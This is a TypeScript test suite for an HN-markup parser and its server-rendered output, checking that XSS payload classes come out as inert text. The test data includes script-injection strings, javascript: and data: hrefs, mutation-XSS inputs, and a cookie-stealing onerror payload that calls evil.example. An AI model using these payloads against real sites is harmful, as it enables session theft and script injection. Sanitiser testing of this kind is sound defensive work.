// @vitest-environment node
/**
 * FEL-426 — the smoke suite `coverage.manifest.json` has been claiming since
 * this example was governed.
 *
 * The manifest declares `"ci": "compile+smoke"` and lists `html` among the
 * features exercised here. It had no `tests/smoke.test.ts` and no
 * `vitest.config.ts`, so `scripts/build-governed-examples.ts` took the
 * no-smoke-suite branch, printed a reassuring "compile-only" line, and ran
 * nothing. The only governed example pointing an intentionally-unsafe
 * primitive at a third-party API was the one whose lane was a no-op.
 *
 * FOUR LAYERS, each guarding something the others cannot see:
 *   1. no-HTML-sink gate — the structural invariant (editor's A8, locally).
 *   2. parser unit tests — payload CLASSES, not the one payload I found.
 *   3. loader wiring — proves the boundary is on the data path.
 *   4. served bytes — the only layer that exercises the SSR emitter, which is
 *      where #572 put the defect.
 */

import { mkdirSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { transform } from '@aihu/compiler'
import { afterAll, describe, expect, it } from 'vitest'
import { resolvePublishedCompilerBinary } from '../../../scripts/lib/compiler-binary.ts'
import { type Block, parseHnMarkup } from '../src/lib/parse-hn-markup.ts'

const __dirname = dirname(fileURLToPath(import.meta.url))
const exampleRoot = resolve(__dirname, '..')
const repoRoot = resolve(exampleRoot, '../..')
const SCRATCH = join(__dirname, '.scratch-smoke')

// Governed examples are compiler consumers. Exercise the installed release
// rather than requiring CI to build and stage compiler source in this repo.
process.env.AIHU_COMPILER_NATIVE = '0'
process.env.AIHU_COMPILE_BIN ??= resolvePublishedCompilerBinary()

afterAll(() => rmSync(SCRATCH, { recursive: true, force: true }))

/** Flatten a parse to the text a reader would see. */
const flat = (bs: Block[]) => bs.flatMap((b) => b.spans.map((s) => s.text)).join('')
/** Every href the parse decided was safe enough to render as a link. */
const hrefs = (bs: Block[]) =>
  bs.flatMap((b) =>
    b.spans.filter((s) => s.kind === 'link').map((s) => (s as { href: string }).href),
  )

/**
 * LAYER 1 — the structural invariant, mirroring the editor package's CI grep
 * gate (A8: "zero HTML-sink APIs anywhere in the package"). Every other test
 * here checks that a payload is handled; this one checks that the dangerous
 * construct is ABSENT, so the class cannot come back via a route I did not
 * think to test.
 */
describe('no HTML sink', () => {
  it('no html={} binding anywhere in the example source', () => {
    const offenders: string[] = []
    const walk = (dir: string) => {
      for (const e of readdirSync(dir, { withFileTypes: true })) {
        const p = join(dir, e.name)
        if (e.isDirectory()) walk(p)
        else if (/\.(aihu|ts)$/.test(e.name)) {
          for (const [i, line] of readFileSync(p, 'utf-8').split('\n').entries()) {
            // The binding, not the word. Prose explaining *why* there is no
            // `html={}` here is the main reason this file would ever mention
            // it, so comment lines are skipped — otherwise the gate fires on
            // its own rationale and the next person deletes the docs to go
            // green. (It did exactly that on first run.)
            const t = line.trim()
            if (t.startsWith('*') || t.startsWith('//') || t.startsWith('/*')) continue
            if (/\bhtml=\{/.test(line)) offenders.push(`${p}:${i + 1}`)
          }
        }
      }
    }
    walk(join(exampleRoot, 'src'))
    expect(offenders).toEqual([])
  })
})

/**
 * LAYER 2 — payload CLASSES.
 *
 * Proving `<img onerror>` dead while the class stays live would be my own test
 * failing "the thing being checked is not the thing that changed". These cover
 * the shapes that break naive implementations, each for a stated reason.
 */
describe('parseHnMarkup — payload classes', () => {
  it('event-handler injection: the tag is data, not an element', () => {
    const bs = parseHnMarkup('Nice. <img src=x onerror="steal()">')
    // `img` is not in the allowlist, so it contributes nothing but its (empty)
    // text. Crucially the OUTPUT IS A STRING, so there is no tag to fire.
    expect(flat(bs)).toBe('Nice. ')
    expect(JSON.stringify(bs)).not.toContain('onerror')
  })

  it('javascript: href is rejected, and the LABEL survives as text', () => {
    const bs = parseHnMarkup('<a href="javascript:alert(1)">click me</a>')
    expect(hrefs(bs)).toEqual([])
    expect(flat(bs)).toBe('click me')
  })

  it.each([
    ['data:text/html,<script>', 'data:'],
    ['vbscript:msgbox(1)', 'vbscript:'],
    ['//evil.example/x', 'protocol-relative'],
    ['  JaVaScRiPt:alert(1)', 'case + leading space'],
  ])('rejects %s (%s)', (href) => {
    expect(hrefs(parseHnMarkup(`<a href="${href}">x</a>`))).toEqual([])
  })

  it.each([
    ['https://example.com/a', 'https'],
    ['http://example.com/a', 'http'],
    ['mailto:x@example.com', 'mailto'],
    ['/item?id=1', 'same-origin path'],
  ])('keeps %s (%s) — rejection must not be indiscriminate', (href) => {
    expect(hrefs(parseHnMarkup(`<a href="${href}">x</a>`))).toEqual([href])
  })

  it('ENCODED scheme is rejected — belt and braces, NOT the decode step', () => {
    // Honest label. These two pass whether or not `readHref` decodes first,
    // because `safeHref` is an allowlist: an encoded scheme matches nothing and
    // is dropped either way. I verified that by deleting the decode and
    // watching this stay green. Kept because the behaviour is worth locking,
    // but it is NOT evidence that decode-before-validate works — the next test
    // is.
    expect(hrefs(parseHnMarkup('<a href="&#106;avascript:alert(1)">x</a>')).length).toBe(0)
    expect(hrefs(parseHnMarkup('<a href="&#x6a;avascript:alert(1)">x</a>')).length).toBe(0)
  })

  it('decodes href BEFORE validating, so an encoded same-origin path survives', () => {
    // The case that actually distinguishes: `&#47;` is `/`. Without the decode
    // this is dropped as unrecognised and the link silently disappears. This
    // test goes red when the decode is removed.
    expect(hrefs(parseHnMarkup('<a href="&#47;item?id=1">story</a>'))).toEqual(['/item?id=1'])
  })

  it('DOUBLE-ENCODED entities decode to text, never to markup', () => {
    // `&amp;lt;script&amp;gt;` -> `&lt;script&gt;` -> `<script>` as TEXT.
    const bs = parseHnMarkup('&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;')
    expect(flat(bs)).toBe('<script>alert(1)</script>')
    // It is text in the data model — there is no element here.
    expect(bs.every((b) => b.spans.every((s) => s.kind === 'text'))).toBe(true)
  })

  it('pre-escaped entities become the characters the author typed', () => {
    expect(flat(parseHnMarkup('a &lt; b &amp;&amp; c &gt; d'))).toBe('a < b && c > d')
  })

  it('attribute injection on an ALLOWED tag drops the attribute', () => {
    const bs = parseHnMarkup('<i onmouseover="steal()" style="x">hover</i>')
    expect(flat(bs)).toBe('hover')
    expect(JSON.stringify(bs)).not.toContain('onmouseover')
    expect(JSON.stringify(bs)).not.toContain('style')
  })

  it.each([
    ['<i>unclosed italic', 'unclosed tag'],
    ['<a href="https://e.com">no close', 'unclosed anchor'],
    ['<<script>script>alert(1)<</script>/script>', 'nested-bracket mXSS'],
    ['<img src="x" onerror=alert(1)//', 'truncated tag'],
    ['<a href=javascript:alert(1)>unquoted</a>', 'unquoted attribute'],
  ])('malformed input %s (%s) degrades to text, never markup', (input) => {
    const bs = parseHnMarkup(input)
    // The invariant is not "parses correctly" — it is "produces only strings".
    for (const b of bs) for (const s of b.spans) expect(typeof s.text).toBe('string')
    expect(hrefs(bs).every((h) => /^(https?:\/\/|mailto:|\/)/.test(h))).toBe(true)
  })

  it('keeps HN real formatting: paragraphs, italics, links, code blocks', () => {
    const bs = parseHnMarkup(
      '<p>First <i>emph</i> and <a href="https://e.com" rel="nofollow">link</a>' +
        '<pre><code>const x = 1</code></pre>',
    )
    expect(bs.some((b) => b.spans.some((s) => s.kind === 'em'))).toBe(true)
    expect(bs.some((b) => b.spans.some((s) => s.kind === 'link'))).toBe(true)
    expect(bs.some((b) => b.kind === 'pre')).toBe(true)
    expect(flat(bs)).toContain('const x = 1')
  })

  it('nested inline marks resolve to the innermost', () => {
    const bs = parseHnMarkup('<i>outer <code>inner</code></i>')
    const kinds = bs.flatMap((b) => b.spans.map((s) => s.kind))
    expect(kinds).toContain('em')
    expect(kinds).toContain('code')
  })

  it('empty / nullish input is empty, not a crash', () => {
    expect(parseHnMarkup(undefined)).toEqual([])
    expect(parseHnMarkup(null)).toEqual([])
    expect(parseHnMarkup('')).toEqual([])
  })
})

/**
 * LAYER 3 — the boundary is WIRED IN. Without this, deleting `parseHnMarkup`
 * from a loader leaves every parser test above green.
 */
describe('loader trust boundary', () => {
  const PAYLOAD = 'Nice. <img src=x onerror="steal()">'

  function stubFetch(payload: unknown) {
    const original = globalThis.fetch
    globalThis.fetch = (async () => ({ json: async () => payload })) as unknown as typeof fetch
    return () => {
      globalThis.fetch = original
    }
  }

  it('item loader emits structured storyBody, not an HTML string', async () => {
    const restore = stubFetch({ id: 1, type: 'story', by: 'a', text: PAYLOAD, time: 0 })
    try {
      const { loader } = await import('../src/pages/item/[id].loader.ts')
      const out = await loader.fn({ params: { id: '1' } } as never)
      expect(Array.isArray(out.storyBody)).toBe(true)
      expect(flat(out.storyBody as Block[])).toBe('Nice. ')
      expect(JSON.stringify(out.storyBody)).not.toContain('onerror')
    } finally {
      restore()
    }
  })

  it('user loader emits structured aboutBody', async () => {
    const restore = stubFetch({ id: 'u', created: 0, karma: 1, about: PAYLOAD })
    try {
      const { loader } = await import('../src/pages/user/[id].loader.ts')
      const out = await loader.fn({ params: { id: 'u' } } as never)
      expect(Array.isArray(out.aboutBody)).toBe(true)
      expect(JSON.stringify(out.aboutBody)).not.toContain('onerror')
    } finally {
      restore()
    }
  })
})

/**
 * LAYER 4 — SERVED BYTES. The only layer that exercises the SSR emitter, which
 * is where #572 put the defect. It runs through the installed compiler release
 * so the governed lane is a consumer test, never a source-build requirement.
 */
describe('served bytes (SSR)', () => {
  it('renders every payload class inert in the served bytes', async () => {
    const src = readFileSync(join(exampleRoot, 'src/components/hn-rich-text.aihu'), 'utf-8')
    const { code } = transform(src, 'src/components/hn-rich-text.aihu', { target: 'server' })

    mkdirSync(SCRATCH, { recursive: true })
    const file = join(SCRATCH, 'hn-rich-text.ssr.ts')
    writeFileSync(
      file,
      code
        .replaceAll("'@aihu/runtime/ssr'", `'${repoRoot}/packages/runtime/src/ssr-string.ts'`)
        .replaceAll("'@aihu/runtime'", `'${repoRoot}/packages/runtime/src/index.ts'`)
        .replaceAll("'@aihu/router'", `'${repoRoot}/packages/router/src/index.ts'`),
    )

    const mod = (await import(/* @vite-ignore */ file)) as {
      __ssrString: (p?: Record<string, unknown>, o?: { hydratable?: boolean }) => string
    }

    const payloads = [
      'Nice. <img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">',
      '<a href="javascript:alert(1)">click</a>',
      '<script>alert(1)</script>',
      '&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;',
      '<i onmouseover="steal()">hover</i>',
      '<<script>script>alert(1)<</script>/script>',
      '<svg/onload=alert(1)>',
    ]

    for (const payload of payloads) {
      const bytes = mod.__ssrString({ blocks: parseHnMarkup(payload) }, { hydratable: true })

      // Assert the PROPERTY. `onerror=` can legitimately occur as inert text
      // inside `&lt;img … onerror=&quot;`; a substring check fails on correct
      // output and pushes the next reader to weaken the parser to satisfy it.
      expect(bytes, payload).not.toMatch(/<[a-zA-Z][^>]*\son[a-z]+\s*=/)
      expect(bytes, payload).not.toContain('<script')
      expect(bytes, payload).not.toContain('<img')
      expect(bytes, payload).not.toContain('<svg')
      expect(bytes, payload).not.toContain('javascript:')
    }

    // Positive assertion — a parser that returned [] would satisfy every
    // negative check above.
    const good = mod.__ssrString(
      { blocks: parseHnMarkup('<p>Hello <i>world</i> <a href="https://e.com">link</a>') },
      { hydratable: true },
    )
    expect(good).toContain('Hello')
    expect(good).toContain('world')
    expect(good).toContain('href="https://e.com"')
  })
})
